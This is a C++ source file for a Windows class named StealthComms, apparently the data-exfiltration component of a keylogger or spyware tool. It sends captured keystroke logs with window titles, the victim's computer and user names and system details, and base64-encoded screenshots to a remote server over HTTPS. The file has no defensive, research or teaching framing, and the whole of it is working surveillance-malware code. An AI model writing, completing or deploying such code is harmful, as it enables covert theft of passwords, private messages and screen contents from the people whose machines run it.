#include "StealthComms.h"
#include <windows.h>
#include <wininet.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <json/json.h>
#include <iostream>
#include <sstream>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "libssl.lib")
#pragma comment(lib, "libcrypto.lib")

StealthComms::StealthComms(const std::string& serverUrl, const std::string& clientId)
    : serverUrl_(serverUrl), clientId_(clientId) {}

bool StealthComms::SendData(const std::string& endpoint, const Json::Value& data) {
    std::string fullUrl = serverUrl_ + "/" + endpoint;
    
    HINTERNET hInternet = InternetOpenA("StealthClient", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return false;

    HINTERNET hConnect = InternetConnectA(hInternet, serverUrl_.c_str(), 443, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return false;
    }

    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", endpoint.c_str(), NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);
    if (!hRequest) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return false;
    }

    std::string jsonData = data.toStyledString();
    
    if (!HttpSendRequestA(hRequest, "Content-Type: application/json", -1, (LPVOID)jsonData.c_str(), jsonData.length())) {
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return false;
    }

    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    return true;
}

bool StealthComms::SendKeyLogs(const std::vector<KeyLogEntry>& logs) {
    Json::Value data;
    data["client_id"] = clientId_;
    
    Json::Value entries(Json::arrayValue);
    for (const auto& log : logs) {
        Json::Value entry;
        entry["timestamp"] = log.timestamp;
        entry["window_title"] = log.windowTitle;
        entry["key_data"] = log.keyData;
        entries.append(entry);
    }
    data["entries"] = entries;

    return SendData("api/data/keylog", data);
}

bool StealthComms::SendSystemInfo(const SystemInfo& systemInfo) {
    Json::Value data;
    data["client_id"] = clientId_;
    
    Json::Value sysInfo;
    sysInfo["computer_name"] = systemInfo.computerName;
    sysInfo["user_name"] = systemInfo.userName;
    sysInfo["os_version"] = systemInfo.osVersion;
    sysInfo["memory_size"] = systemInfo.memorySize;
    sysInfo["processor_info"] = systemInfo.processorInfo;
    
    data["data"] = sysInfo;

    return SendData("api/data/system", data);
}

bool StealthComms::SendScreenshot(const std::vector<unsigned char>& imageData) {
    Json::Value data;
    data["client_id"] = clientId_;
    
    std::string base64Data = Base64Encode(imageData.data(), imageData.size());
    data["image_data"] = base64Data;

    return SendData("api/data/screenshot", data);
}

std::string StealthComms::Base64Encode(const unsigned char* data, size_t length) {
    BIO* b64 = BIO_new(BIO_f_base64());
    BIO* mem = BIO_new(BIO_s_mem());
    b64 = BIO_push(b64, mem);
    
    BIO_write(b64, data, length);
    BIO_flush(b64);
    
    BUF_MEM* memPtr;
    BIO_get_mem_ptr(b64, &memPtr);
    
    std::string result(memPtr->data, memPtr->length);
    BIO_free_all(b64);
    
    return result;
}